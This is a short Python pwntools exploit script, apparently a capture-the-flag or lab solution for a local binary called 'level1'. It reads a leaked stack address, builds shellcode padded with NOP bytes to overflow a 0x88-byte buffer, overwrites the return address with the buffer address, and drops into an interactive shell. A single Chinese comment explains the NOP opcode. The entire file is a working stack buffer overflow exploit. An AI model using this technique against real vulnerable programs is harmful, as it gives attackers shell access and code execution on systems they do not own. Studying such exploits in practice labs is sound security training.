from pwn import *

shellcode = asm(shellcraft.sh())

io = process("./level1")

get_addr = io.recvline()

print(get_addr)


buff_addr = get_addr[12:22]
print(buff_addr)

buff_addr = int( buff_addr , 16 )

payload = shellcode + b'\x90' * ( 0x88 + 4 - len(shellcode) ) + p32(buff_addr)
#\x90是nop步过指令的x86机器码

io.sendline(payload)

io.interactive()
